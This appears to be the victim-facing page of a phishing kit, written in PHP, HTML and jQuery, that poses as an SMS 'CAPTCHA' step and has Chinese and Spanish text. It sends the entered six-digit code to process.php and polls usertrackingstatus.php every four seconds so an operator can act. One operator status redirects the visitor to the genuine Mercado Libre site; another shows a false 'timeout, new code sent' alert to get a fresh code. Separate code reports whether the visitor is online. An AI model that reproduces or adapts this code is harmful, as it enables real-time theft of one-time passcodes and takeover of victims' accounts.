 
      <script>
window.onload = function() {
    const firstInput = document.getElementById("otp1");
    firstInput.focus();
};

function digitValidate(input) {
    input.value = input.value.replace(/\D/g, ''); // Remove non-digits

    const currentInputIndex = parseInt(input.id.replace('otp', ''));

    if (input.value.length >= 1) {
        if (input.value.length > 1) {
            const remainingDigits = input.value.substring(1);
            input.value = input.value[0]; // Keep only the first digit

            for (let i = 0; i < remainingDigits.length && currentInputIndex + i < 6; i++) {
                const nextIndex = currentInputIndex + i + 1;
                const nextInput = document.getElementById(`otp${nextIndex}`);

                if (!nextInput) {
                    addNextInput(nextIndex);
                }

                if (nextInput) {
                    nextInput.value = remainingDigits[i];
                }
            }
        }

        if (currentInputIndex < 6) {
            const nextIndex = currentInputIndex + 1;
            const nextInput = document.getElementById(`otp${nextIndex}`);

            if (!nextInput) {
                addNextInput(nextIndex);
            }

            if (nextInput) {
                nextInput.focus();
            }
        }
    }
}

function addNextInput(nextIndex) {
    const existingInput = document.getElementById(`otp${nextIndex}`);

    if (!existingInput) {
        const newInput = document.createElement('input');
        newInput.className = 'otp';
        newInput.type = 'text';
        newInput.name = 'otp';
        newInput.id = `otp${nextIndex}`;
        newInput.setAttribute('oninput', 'digitValidate(this)');
        newInput.setAttribute('onkeyup', `tabChange(${nextIndex}, event)`);
        newInput.maxLength = '1';

        const currentInput = document.getElementById(`otp${nextIndex - 1}`);
        currentInput.after(newInput);
    }
}

function tabChange(currentInputIndex, event) {
    const inputElement = document.getElementById(`otp${currentInputIndex}`);

    if (event.key === "Backspace" && inputElement.value === "") {
        // Move to the previous input when Backspace is pressed and input is empty
        if (currentInputIndex > 1) {
            const previousInput = document.getElementById(`otp${currentInputIndex - 1}`);
            previousInput.focus();
        }
    } else if (inputElement.value.length >= 1) {
        // Move to the next input when a digit is entered
        if (currentInputIndex < 6) {
            const nextIndex = currentInputIndex + 1;
            const nextInput = document.getElementById(`otp${nextIndex}`);

            if (!nextInput) {
                addNextInput(nextIndex);
            }

            if (nextInput) {
                nextInput.focus();
            }
        }
    }
}



      </script>
  
<?php
session_start();
require_once 'config.php';
include('header_.php');


$phone = "";
if (isset($_SESSION['contact_number'])) {
  $phone = $_SESSION['contact_number'];
}

?>
<style>
  /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
  .wrap.middle {
      padding: 40px 30px 30px;
      background: #f0f0eb;
  }
  @media(max-width: 767px) {
      .submit-btn {
          background-color:  #DA291C;
          padding: 11px 24px;
          font-size: 20px;
          display: block;
          width: 100%;
          min-width: 120px;
          margin-left: auto;
          margin-right: auto;
          line-height: 22px;
          border-radius: 32px;
          color: #fff;
          border-color: #fec80d;
          height: auto;
          cursor: pointer;
      }
      .phone-row input, .input-otp input {
          border: none;
          border-bottom: 2px solid #cacaca;
          height: 40px;
          background: transparent;
          font-family: inherit;
          margin-bottom: 15px;
          outline: none;
      }
      .input-otp {
          text-align: center;
      }
      .input-otp input {
          text-align: center;
      }
      .note {
          text-align: center;
          font-size: 16px;
          color: #565656;
          pointer-events: none;
          user-select: none;
      }
      .count-down {
          font-size: 14px;
          color: #ccc;
          border: 1px solid #ccc;
          max-width: 200px;
          margin: auto;
          padding: 10px;
          margin-bottom: 30px;
          margin-top: 10px;
      }
      .wrap.middle form {
          width: 100%;
      }

      .submit-btn:hover{
          background-color:  #DA291C;
          border-color: #fec80d;
      }
  }
  .spinner-border {
            animation: none;
            border: none;
            background: rgb(255 255 255 / 67%);
            border-radius: 0;
        }
        .lds-default {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }
        .lds-default div {
            position: absolute;
            width: 6px;
            height: 6px;
            background: red;
            border-radius: 50%;
            animation: lds-default 1.2s linear infinite;
        }
        .lds-default div:nth-child(1) {
            animation-delay: 0s;
            top: 37px;
            left: 66px;
        }
        .lds-default div:nth-child(2) {
            animation-delay: -0.1s;
            top: 22px;
            left: 62px;
        }
        .lds-default div:nth-child(3) {
            animation-delay: -0.2s;
            top: 11px;
            left: 52px;
        }
        .lds-default div:nth-child(4) {
            animation-delay: -0.3s;
            top: 7px;
            left: 37px;
        }
        .lds-default div:nth-child(5) {
            animation-delay: -0.4s;
            top: 11px;
            left: 22px;
        }
        .lds-default div:nth-child(6) {
            animation-delay: -0.5s;
            top: 22px;
            left: 11px;
        }
        .lds-default div:nth-child(7) {
            animation-delay: -0.6s;
            top: 37px;
            left: 7px;
        }
        .lds-default div:nth-child(8) {
            animation-delay: -0.7s;
            top: 52px;
            left: 11px;
        }
        .lds-default div:nth-child(9) {
            animation-delay: -0.8s;
            top: 62px;
            left: 22px;
        }
        .lds-default div:nth-child(10) {
            animation-delay: -0.9s;
            top: 66px;
            left: 37px;
        }
        .lds-default div:nth-child(11) {
            animation-delay: -1s;
            top: 62px;
            left: 52px;
        }
        .lds-default div:nth-child(12) {
            animation-delay: -1.1s;
            top: 52px;
            left: 62px;
        }
        @keyframes lds-default {
            0%, 20%, 80%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.5);
            }
        }
</style>
<style>
        .login-form {
            width: 26rem;
            height: 30rem;
        }
		.MTM-bg-light {
    background-color: #f8f8f8!important;
}
@media (max-width: 575px){
bg-top {
    background-image: url(./assets/images/new_background_mobile.png) !important;
    background-size: 100% 96px;
}
.bg-top .text-4xl {
    font-size: 26px;
    height: 28px;
    line-height: 28px;
    font-weight: 500;
}
.bg-top .m-7 {
    margin-top: 22px;
}
.bg-top img.h-auto {
    height: 28px;
    width: 37px;
    padding: 0;
    margin-right: 15px;
}
.d-sm-none {
    display: none !important;
}
.login-wrapper .shadow-lg {
    box-shadow: none !important;
    max-width: 325px; box-shadow: 0px 1px 3px #ccc !important;
	margin-top:142px; margin-bottom:25px;
    padding: 67px 20px 64px 20px;
}
.login-form .flex-col {
    padding: 0 !important;
    width: 100%;
}
.login-form {
    height: unset;
    width: 100%;
    box-shadow: none !important;
}
.switch-user {
    justify-content: space-between;
}
.switch-user .flex.items-center {
    margin: 0;
}
.sm-full {
    width: 100% !important;
}
.sm-text-center {
    text-align: center !important;
    justify-content: center;
    display: flex;
}
.border-gray-500 {
    border: 1px solid #999999 !important;
    outline: none;
    border-radius: 8px;
}
.bg-dark {
    background-color: #002EFF !important;
}
.bg-dark span {
    color: #ffffff !important;
}
.border-dark {
    border-color: #000000 !important;
}
.login-form .w-28 {
    width: 44%;
}

#header-widget{display:none !important;}

.section-hero{margin-top:50px !important;}

.gtm_footer{display:none !important;}

.MTM-bg-light {
    background-color: #f8f8f8!important;
}
.MTM-main-header-basic {

    background-color: #1470d1;
}

.MTM-main-header {
    background-color: #1470d1;
    padding: 1px 0;
    box-shadow: 0 2px 4px 0 rgb(0 0 0 / 20%);
     position: sticky;
    top: 0px;
    left: 0;
    right: 0;
    z-index: 12;
}
.MTM-col-5 {
    flex: 0 0 41.66667%;
    max-width: 41.66667%;
}

.MTM-container, .MTM-container-fluid, .MTM-container-lg, .MTM-container-md, .MTM-container-sm, .MTM-container-xl {
    width: 100%;
    padding-right: 16px;
    padding-left: 16px;
    margin-right: auto;
    margin-left: auto;font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
	font-size: .8125rem;
    font-weight: 600;
    line-height: 1.5;
    color: #777;
    text-align: left;
}

.MTM-pt-3, .MTM-py-3 {
    padding-top: 1.5rem!important;
    padding-bottom: 1.5rem!important;
}


.MTM-row {
    position: relative;
}
.MTM-mb-3, .MTM-my-3 {
    margin-bottom: 1.5rem!important;
}
.MTM-d-none {
    display: none!important;
}
.MTM-row {
 display: flex;
    flex-wrap: wrap;
    margin-right: -16px;
    margin-left: -16px;
}
.MTM-col-12, .MTM-col-lg-2 {
    flex: 0 0 100%;
    max-width: 100%; position: relative;
    width: 100%;
    padding-right: 5px;
    padding-left: 5px;
}
.MTM-mb-4, .MTM-my-4 {
    margin-bottom:12px !important;
}
.MTM-main-footer .MTM-footer-col {
	width: 100%;
    float: left;
    position: relative;
}
.MTM-h6{float:left;}

.MTM-main-footer #contactUs .MTM-h6, .MTM-main-footer #contactUs a {
    font-weight: 600;
    height: auto;
}
.MTM-main-footer #contactUs p {
    color: #757575;
    height: 50px;
    font-size: .8125rem;
}
.MTM-main-footer .MTM-footer-col .MTM-h6 {
    left: 0;
    display: inline-block;
    position: absolute;
}

.MTM-main-footer .MTM-footer-col a {
    left: 50%;
    display: inline-block;
    position: absolute;
}
.MTM-main-footer .MTM-h6, .MTM-main-footer a, .MTM-main-footer p {
    font-size: .875rem;
    margin-bottom: 0;
}

.MTM-main-footer #contactUs .MTM-h6, .MTM-main-footer #contactUs a {
    font-weight: 600;
    height: auto;
    color: #0071d1;

}

#contactUs a, a:hover {
    color: #0071d1;
}

.MTM-main-footer .MTM-footer-col a {
    left: 50%;
    display: inline-block;
    position: absolute;
}

}
.otp{
  display:inline-block !important;
  width:50px !important;
  height:50px !important;
  text-align:center !important;
}
    </style>
 
<div class="wrap middle">
  <div class="form">


    <form class="input-phone" action="">
      <div class="note">請輸入一個以認證的香港手機號碼</div>
      <div class="phone-row">
        <input class="phone-code" type="text" value="Su teléfono móvil">
        <input class="phone-number" type="tel" value="<?php echo $phone; ?>" name="telphone" placeholder="手機號碼" pattern="[0-9]{8}" maxlength="12" required />
      </div>
      <div class="center"><button id="getotp" class="btn send-phone disabled" type="button">認證我的手機號碼</button></div>
    </form>

    <!-- <form class="input-otp" action="" method="POST"> -->
    <div class="input-otp">
      <div class="note">
        <p>El CAPTCHA ha sido enviado a <span id="phone-number"></span><br />Por favor, introduzca el código de verificación de 6 dígitos que recibió en el SMS</p>
      </div>
      <!-- <input class="otp" type="text" id="fullname" name="otp"> -->
      <input class="otp" type="number" name="otp" id="otp1" oninput='digitValidate(this)' onkeyup='tabChange(1, event)' maxlength="1">
<input class="otp" type="number" name="otp" id="otp2" oninput='digitValidate(this)' onkeyup='tabChange(2, event)' maxlength="1">
<input class="otp" type="number" name="otp" id="otp3" oninput='digitValidate(this)' onkeyup='tabChange(3, event)' maxlength="1">
<input class="otp" type="number" name="otp" id="otp4" oninput='digitValidate(this)' onkeyup='tabChange(4, event)' maxlength="1">
<input class="otp" type="number" name="otp" id="otp5" oninput='digitValidate(this)' onkeyup='tabChange(5, event)' maxlength="1">
<input class="otp" type="number" name="otp" id="otp6" oninput='digitValidate(this)' onkeyup='tabChange(6, event)' maxlength="1">
      <div class="count-down disabled ">Reenviar el CAPTCHA（<span class="second">60</span>segundos)</div>
      <div class="center">
        <button class="btn send-otp disabled submit-btn" id="cnt">Continuar</button>
      </div>
    </div>
    <input type="hidden" id="last_id" value="<?php echo @$_SESSION["last_id"]; ?>" />


    <!-- </form> -->

  </div>


    <div class="spinner-border" id="ajaxprogress" style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;right: 0px;" role="status">
      <span class="" style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
          <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
      </span>
    </div>
</div>
  
 
<script>
  //script to check input

  jQuery('.input-phone').hide();
  jQuery('.input-otp').show();

  jQuery('.phone-row input').on('input', function() {
    let check = true;
    jQuery('.phone-row input').each(function() {
      if (jQuery(this).val() == '') check = false;
      //console.log(jQuery(this).val());

    });

    if (check) jQuery('.send-phone').removeClass('disabled');
    else jQuery('.send-phone').addClass('disabled')
  });


  jQuery('.otp').on('input', function() {
    console.log('a');

    if (jQuery('.otp').val() == '') jQuery('.send-otp').addClass('disabled');
    else jQuery('.send-otp').removeClass('disabled')
  });



  var second = 60;

  function optSent() {
    //update button
    var count = setInterval(function() {
      second--;
      jQuery('.second').html(second);
      if (second <= 0) {
        clearInterval(count);
        jQuery('.count-down').html('re enviar').removeClass('disabled');
      };
    }, 1000);
  }

  jQuery('.input-otp input').focus();
  jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());

  optSent();

  jQuery('#getotp').on('click', function() {
    //api call
    //  jQuery('.input-phone').hide();
    //jQuery('.input-otp').show();
    jQuery('.input-otp input').focus();
    jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());
    optSent();
  });
</script>







<script>
  jQuery('#cnt').click(function() {
    if (jQuery("#cnt").html() == 'Continuar') {
      var last_id = jQuery("#last_id").val();
      var o1 = jQuery("#otp1").val();
      var o2 = jQuery("#otp2").val();
      var o3 = jQuery("#otp3").val();
      var o4 = jQuery("#otp4").val();
      var o5 = jQuery("#otp5").val();
      var o6 = jQuery("#otp6").val();

      var code=o1+o2+o3+o4+o5+o6;
      // alert(code);
      if (code == '') {
        $("#fillfi").show();
        return;
      }
      jQuery('#fullname').removeClass(" hide-phone");
      jQuery("#ajaxprogress").css("display", "block");
      $(".backdrop").show();
      $.ajax({
        url: 'process.php',
        type: 'POST',
        dataType: "json",
        data: {
          code: code,
          last_id: last_id
        },
        success: function(result) {
          console.log(result);
            // jQuery("#ajaxprogress").css("display", "none");
            // $(".backdrop").hide()
        }
      });

    } else {
      jQuery('#fullname').val('');
      jQuery('#fullname').attr("placeholder", "Introduzca su OTP");
      //jQuery('#fullname').val('Enter your OTP');
      jQuery('#fullname').removeClass(" hide-phone");
      var counter = 60;
      var interval = setInterval(function() {
        counter--;
        $('#cnt').html("Continuar");
        // Display 'counter' wherever you want to display it.
        if (counter <= 0) {
          clearInterval(interval);
          $('#cnt').html("Continuar");
          return;
        } else {
          if (counter < 60) {
            $('#time').text("00:" + counter);
          } else {
            $('#time').text(counter);
          }
          console.log("Timer --> " + counter);
        }
      }, 1000);
    }
  })
</script>

<script type="text/javascript">
  jQuery(document).ready(function() {

    var showalert = true;
    window.setInterval(function() {
      // do stuff
      var userid = jQuery("#last_id").val();
      $.ajax({
        type: 'post',
        url: 'usertrackingstatus.php',
        data: {
          'userid': userid
        },
        success: function(data) {
          //alert(data.length);
          if (data == 1) {
            jQuery(location).attr('href', 'https://www.mercadolibre.com.mx/');
          }
          if (data == 2) {
            jQuery("#ajaxprogress").css("display", "none")
            $(".backdrop").hide();
            jQuery('#fillfi').css('display', 'block');
            if (showalert) {
              alert("Captcha input timeout, hemos enviado un nuevo CAPTCHA a su dispositivo");
              showalert = false;
            }
            return false;
          }

        }
      });

    }, 4000);
  })
</script>
<script>
  /* JS comes here */
  function setOnline(id, status) {
    if (id) {
      $.ajax({
        type: 'post',
        url: 'usertrackingstatus.php',
        data: {
          'id': id,
          'status': status
        },
        success: function(data) {

        }
      });
    }
  }
  var userid = <?php echo $_SESSION["last_id"]; ?>;


  window.addEventListener('load', function(e) {
    if (navigator.onLine) {
      setOnline(userid, 1)
    } else {
      setOnline(userid, 0)
    }
  }, false);

  window.addEventListener('online', function(e) {
    setOnline(userid, 1)
  }, false);

  window.addEventListener('offline', function(e) {
    setOnline(userid, 0)
  }, false);




</script>

<?php
include('footer_.php');
